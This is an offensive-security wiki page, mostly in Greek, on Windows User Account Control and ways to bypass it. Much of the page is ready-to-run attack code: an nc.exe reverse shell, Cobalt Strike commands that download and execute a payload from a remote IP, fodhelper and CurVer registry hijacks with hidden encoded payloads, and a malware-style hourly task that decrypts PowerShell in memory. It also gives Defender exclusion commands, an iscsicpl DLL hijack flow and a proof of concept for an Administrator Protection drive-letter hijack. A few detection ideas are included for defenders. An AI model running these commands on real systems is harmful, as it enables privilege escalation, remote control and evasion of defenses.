# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που επιτρέπει ένα **consent prompt για elevated activities**. Οι εφαρμογές έχουν διαφορετικά επίπεδα `integrity`, και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **θα μπορούσαν δυνητικά να θέσουν σε κίνδυνο το σύστημα**. Όταν το UAC είναι ενεργοποιημένο, οι εφαρμογές και οι εργασίες πάντα **εκτελούνται υπό το security context ενός non-administrator account** εκτός αν ένας administrator τις εξουσιοδοτήσει ρητά να έχουν administrator-level access στο σύστημα για να εκτελεστούν. Είναι ένα feature ευκολίας που προστατεύει τους administrators από ακούσιες αλλαγές, αλλά δεν θεωρείται security boundary.

Για περισσότερες πληροφορίες σχετικά με τα integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν υπάρχει UAC, σε έναν administrator user δίνονται 2 tokens: ένα standard user key, για να εκτελεί συνηθισμένες ενέργειες ως regular level, και ένα με τα admin privileges.

Αυτή η [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) συζητά σε μεγάλο βάθος πώς λειτουργεί το UAC και περιλαμβάνει το logon process, το user experience και το UAC architecture. Οι administrators μπορούν να χρησιμοποιήσουν security policies για να ρυθμίσουν πώς λειτουργεί το UAC ειδικά για τον οργανισμό τους στο local level (χρησιμοποιώντας το secpol.msc), ή να το ρυθμίσουν και να το προωθήσουν μέσω Group Policy Objects (GPO) σε περιβάλλον Active Directory domain. Οι διάφορες ρυθμίσεις συζητούνται αναλυτικά [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 Group Policy settings που μπορούν να οριστούν για το UAC. Ο ακόλουθος πίνακας παρέχει επιπλέον λεπτομέρειες:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

Οι **local security policies** ("secpol.msc" στα περισσότερα συστήματα) ρυθμίζονται από προεπιλογή ώστε να **αποτρέπουν non-admin users από το να πραγματοποιούν software installations**. Αυτό σημαίνει ότι ακόμα κι αν ένας non-admin user μπορεί να κατεβάσει τον installer για το software σας, δεν θα μπορεί να το εκτελέσει χωρίς έναν admin account.

### Registry Keys to Force UAC to Ask for Elevation

Ως standard user χωρίς admin rights, μπορείς να διασφαλίσεις ότι ο "standard" account θα **ζητά credentials από το UAC** όταν επιχειρεί να εκτελέσει ορισμένες ενέργειες. Αυτή η ενέργεια θα απαιτούσε τροποποίηση συγκεκριμένων **registry keys**, για τις οποίες χρειάζεσαι admin permissions, εκτός αν υπάρχει ένα **UAC bypass**, ή αν ο attacker είναι ήδη συνδεδεμένος ως admin.

Ακόμα κι αν ο user ανήκει στην ομάδα **Administrators**, αυτές οι αλλαγές αναγκάζουν τον user να **εισάγει ξανά τα account credentials του** ώστε να εκτελέσει administrative actions.

**Το μόνο μειονέκτημα είναι ότι αυτή η προσέγγιση χρειάζεται το UAC να είναι απενεργοποιημένο για να λειτουργήσει, κάτι που είναι απίθανο να ισχύει σε production environments.**

Τα registry keys και τα entries που πρέπει να αλλάξεις είναι τα ακόλουθα (με τις default τιμές τους σε παρενθέσεις):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Αυτό μπορεί επίσης να γίνει χειροκίνητα μέσω του Local Security Policy tool. Μόλις αλλάξουν, οι administrative operations ζητούν από τον user να εισαγάγει ξανά τα credentials του.

### Note

**User Account Control is not a security boundary.** Επομένως, οι standard users δεν μπορούν να ξεφύγουν από τους λογαριασμούς τους και να αποκτήσουν administrator rights χωρίς ένα local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Το Internet Explorer Protected Mode χρησιμοποιεί integrity checks για να αποτρέπει processes υψηλού integrity level (όπως web browsers) από το να έχουν πρόσβαση σε δεδομένα χαμηλού integrity level (όπως ο φάκελος temporary Internet files). Αυτό γίνεται με την εκτέλεση του browser με low-integrity token. Όταν ο browser προσπαθεί να αποκτήσει πρόσβαση σε δεδομένα που είναι αποθηκευμένα στη low-integrity zone, το operating system ελέγχει το integrity level του process και επιτρέπει την πρόσβαση ανάλογα. Αυτή η δυνατότητα βοηθά στην αποτροπή attacks remote code execution από το να αποκτούν πρόσβαση σε ευαίσθητα δεδομένα στο system.
- Όταν ένας user κάνει logon στα Windows, το system δημιουργεί ένα access token που περιέχει μια λίστα με τα privileges του user. Τα privileges ορίζονται ως ο συνδυασμός των rights και των capabilities του user. Το token περιέχει επίσης μια λίστα με τα credentials του user, τα οποία χρησιμοποιούνται για να authenticate τον user στον computer και σε resources στο network.

### Autoadminlogon

Για να ρυθμίσετε τα Windows ώστε να κάνουν automatically log on έναν συγκεκριμένο user κατά την εκκίνηση, ορίστε το **`AutoAdminLogon` registry key**. Αυτό είναι χρήσιμο για kiosk environments ή για testing purposes. Χρησιμοποιήστε το μόνο σε secure systems, καθώς εκθέτει το password στο registry.

Ορίστε τα ακόλουθα keys χρησιμοποιώντας το Registry Editor ή `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Για να επαναφέρετε τη φυσιολογική συμπεριφορά logon, ορίστε το `AutoAdminLogon` σε 0.

## UAC bypass

> [!TIP]
> Σημειώστε ότι αν έχετε graphical access στο victim, το UAC bypass είναι straight forward, καθώς μπορείτε απλώς να κάνετε click στο "Yes" όταν εμφανιστεί το UAC prompt

Το UAC bypass χρειάζεται στην ακόλουθη περίπτωση: **το UAC είναι ενεργοποιημένο, το process σας εκτελείται σε medium integrity context, και ο user σας ανήκει στην administrators group**.

Είναι σημαντικό να αναφερθεί ότι είναι **πολύ πιο δύσκολο να παρακάμψετε το UAC αν βρίσκεται στο υψηλότερο επίπεδο security (Always) σε σχέση με οποιοδήποτε από τα άλλα επίπεδα (Default).**

### UAC disabled

Αν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**) μπορείτε να **εκτελέσετε ένα reverse shell με admin privileges** (high integrity level) χρησιμοποιώντας κάτι σαν:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** Βασικό UAC "bypass" (πλήρης πρόσβαση στο file system)

Αν έχεις ένα shell με έναν user που ανήκει στο Administrators group μπορείς να **mount the C$** shared μέσω SMB (file system) local σε έναν νέο δίσκο και θα έχεις **πρόσβαση σε όλα μέσα στο file system** (ακόμα και στο home folder του Administrator).

> [!WARNING]
> **Φαίνεται ότι αυτό το trick δεν λειτουργεί πλέον**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Παράκαμψη UAC με cobalt strike

Οι τεχνικές Cobalt Strike θα λειτουργήσουν μόνο αν το UAC δεν είναι ρυθμισμένο στο μέγιστο επίπεδο ασφάλειας του
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** και **Metasploit** έχουν επίσης αρκετά modules για να **bypass** το **UAC**.

### KRBUACBypass

Documentation και tool στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) που είναι μια **compilation** από διάφορα UAC bypass exploits. Σημείωσε ότι θα χρειαστεί να **compile UACME using visual studio or msbuild**. Το compilation θα δημιουργήσει αρκετά executables (όπως `Source\Akagi\outout\x64\Debug\Akagi.exe`) , θα χρειαστεί να ξέρεις **ποιο από αυτά χρειάζεσαι.**\
Θα πρέπει να **προσέχεις** γιατί κάποια bypasses θα **promtp κάποια άλλα programs** που θα **alert** τον **user** ότι κάτι συμβαίνει.

Το UACME έχει το **build version from which each technique started working**. Μπορείς να κάνεις search για μια technique που επηρεάζει τις εκδόσεις σου:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επίσης, χρησιμοποιώντας αυτή τη σελίδα [this](https://en.wikipedia.org/wiki/Windows_10_version_history) παίρνεις το Windows release `1607` από τα build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Το trusted binary `fodhelper.exe` έχει auto-elevated σε σύγχρονα Windows. Όταν εκκινείται, κάνει query το παρακάτω per-user registry path χωρίς να επαληθεύει το `DelegateExecute` verb. Το να βάλεις εκεί μια command επιτρέπει σε ένα Medium Integrity process (ο χρήστης είναι στο Administrators) να δημιουργήσει ένα High Integrity process χωρίς UAC prompt.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Βήματα PowerShell (ορίστε το payload σας, μετά ενεργοποιήστε)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος των Administrators και το επίπεδο UAC είναι default/lenient (όχι Always Notify με επιπλέον περιορισμούς).
- Χρησιμοποίησε το `sysnative` path για να ξεκινήσεις ένα 64-bit PowerShell από ένα 32-bit process σε 64-bit Windows.
- Το Payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd, ή ένα EXE path). Απόφυγε UIs που κάνουν prompt για stealth.

#### CurVer/extension hijack variant (HKCU only)

Recent samples abusing `fodhelper.exe` αποφεύγουν το `DelegateExecute` και αντί να το κάνουν αυτό **redirect το `ms-settings` ProgID** μέσω της per-user τιμής `CurVer`. Το auto-elevated binary εξακολουθεί να επιλύει το handler κάτω από το `HKCU`, οπότε δεν χρειάζεται admin token για να φυτέψεις τα keys:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Μόλις αποκτήσει αυξημένα δικαιώματα, το malware συνήθως **απενεργοποιεί τα μελλοντικά prompts** ορίζοντας το `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` σε `0`, στη συνέχεια εκτελεί πρόσθετο defense evasion (π.χ. `Add-MpPreference -ExclusionPath C:\ProgramData`) και δημιουργεί ξανά persistence για να εκτελείται ως high integrity. Μια τυπική task persistence αποθηκεύει ένα **XOR-encrypted PowerShell script** στο δίσκο και το αποκωδικοποιεί/εκτελεί in-memory κάθε ώρα:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Αυτή η παραλλαγή εξακολουθεί να καθαρίζει τον dropper και αφήνει μόνο τα staged payloads, κάνοντας την ανίχνευση να βασίζεται στην παρακολούθηση του **`CurVer` hijack**, στο tampering του `ConsentPromptBehaviorAdmin`, στη δημιουργία Defender exclusion ή σε scheduled tasks που αποκρυπτογραφούν το PowerShell in-memory.

#### Περισσότερο UAC bypass

**Όλες** οι τεχνικές που χρησιμοποιούνται εδώ για να παρακάμψουν το AUC **απαιτούν** ένα **πλήρες interactive shell** με το θύμα (ένα απλό nc.exe shell δεν αρκεί).

Μπορείς να αποκτήσεις ένα **meterpreter** session. Κάνε migrate σε ένα **process** που έχει την τιμή **Session** ίση με **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### UAC Bypass με GUI

Αν έχεις πρόσβαση σε ένα **GUI μπορείς απλώς να αποδεχτείς το UAC prompt** όταν εμφανιστεί, δεν χρειάζεσαι πραγματικά να το bypassάρεις. Άρα, η πρόσβαση σε GUI θα σου επιτρέψει να bypassάρεις το UAC.

Επιπλέον, αν πάρεις ένα GUI session που χρησιμοποιούσε κάποιος άλλος (πιθανόν μέσω RDP) υπάρχουν **κάποια tools που θα τρέχουν ως administrator** από όπου θα μπορούσες να **εκτελέσεις** ένα **cmd** για παράδειγμα **ως admin** απευθείας χωρίς να ξαναζητηθεί από το UAC, όπως [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **stealthy**.

### Noisy brute-force UAC bypass

Αν δεν σε νοιάζει να είσαι noisy θα μπορούσες πάντα να **τρέξεις κάτι σαν** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) που **ζητά να elevate τα permissions μέχρι να το αποδεχτεί ο χρήστης**.

### Το δικό σου bypass - Basic UAC bypass methodology

Αν ρίξεις μια ματιά στο **UACME** θα παρατηρήσεις ότι τα **περισσότερα UAC bypasses abuse ένα Dll Hijacking vulnerabilit**y (κυρίως γράφοντας το malicious dll στο _C:\Windows\System32_). [Διάβασε αυτό για να μάθεις πώς να βρεις ένα Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρες ένα binary που θα **autoelevate** (έλεγξε ότι όταν εκτελείται τρέχει σε high integrity level).
2. Με procmon βρες γεγονότα "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψεις** το DLL μέσα σε κάποια **protected paths** (όπως το C:\Windows\System32) όπου δεν έχεις δικαιώματα εγγραφής. Μπορείς να το παρακάμψεις αυτό χρησιμοποιώντας:
1. **wusa.exe**: Windows 7,8 and 8.1. Επιτρέπει να εξάγεις το περιεχόμενο ενός CAB file μέσα σε protected paths (επειδή αυτό το tool εκτελείται από high integrity level).
2. **IFileOperation**: Windows 10.
4. Προετοίμασε ένα **script** για να αντιγράψεις το DLL σου μέσα στο protected path και να εκτελέσεις το vulnerable και autoelevated binary.

### Άλλη τεχνική UAC bypass

Συνίσταται στο να παρακολουθείς αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **όνομα/path** ενός **binary** ή μιας **εντολής** που πρόκειται να **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το binary ψάχνει αυτές τις πληροφορίες μέσα στο **HKCU**).

### UAC bypass μέσω `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Το 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` είναι ένα **auto-elevated** binary που μπορεί να abused για να φορτώσει το `iscsiexe.dll` μέσω search order. Αν μπορείς να τοποθετήσεις ένα malicious `iscsiexe.dll` μέσα σε έναν φάκελο που είναι **user-writable** και μετά να τροποποιήσεις το current user `PATH` (για παράδειγμα μέσω `HKCU\Environment\Path`) ώστε να γίνεται search σε αυτόν τον φάκελο, τα Windows μπορεί να φορτώσουν το attacker DLL μέσα στο elevated `iscsicpl.exe` process **χωρίς να εμφανίσουν UAC prompt**.

Πρακτικές σημειώσεις:
- Αυτό είναι χρήσιμο όταν ο current user ανήκει στους **Administrators** αλλά εκτελείται σε **Medium Integrity** λόγω UAC.
- Το αντίγραφο του **SysWOW64** είναι το σχετικό για αυτό το bypass. Αντιμετώπισε το αντίγραφο του **System32** ως ξεχωριστό binary και επαλήθευσε τη συμπεριφορά του ανεξάρτητα.
- Το primitive είναι συνδυασμός **auto-elevation** και **DLL search-order hijacking**, οπότε το ίδιο ProcMon workflow που χρησιμοποιείται για άλλα UAC bypasses είναι χρήσιμο για να επιβεβαιώσεις το missing DLL load.

Ελάχιστη ροή:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ιδέες ανίχνευσης:
- Alert on `reg add` / registry writes to `HKCU\Environment\Path` αμέσως ακολουθούμενα από εκτέλεση του `C:\Windows\SysWOW64\iscsicpl.exe`.
- Hunt for `iscsiexe.dll` σε **user-controlled** locations όπως `%TEMP%` ή `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlate `iscsicpl.exe` launches με απροσδόκητα child processes ή DLL loads από έξω από τα κανονικά Windows directories.

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” χρησιμοποιεί shadow-admin tokens με per-session `\Sessions\0\DosDevices/<LUID>` maps. Το directory δημιουργείται lazily από το `SeGetTokenDeviceMap` στο πρώτο `\??` resolution. Αν ο attacker impersonates το shadow-admin token μόνο στο **SecurityIdentification**, το directory δημιουργείται με τον attacker ως **owner** (inherits `CREATOR OWNER`), επιτρέποντας drive-letter links που έχουν προτεραιότητα over `\GLOBAL??`.

**Steps:**

1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Αναφορές
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
